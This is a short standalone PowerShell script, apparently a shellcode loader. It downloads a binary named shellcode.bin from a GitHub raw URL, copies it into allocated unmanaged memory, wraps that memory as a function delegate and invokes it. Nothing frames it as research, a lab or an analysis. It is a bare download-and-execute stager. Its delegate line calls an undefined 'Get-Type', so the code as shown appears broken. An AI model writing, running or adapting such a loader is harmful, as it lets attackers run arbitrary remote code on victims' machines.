$url = "https://raw.githubusercontent.com/SoHohh/juazetesplease/main/shellcode.bin"
$shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, (Get-Type))
$delegate.Invoke()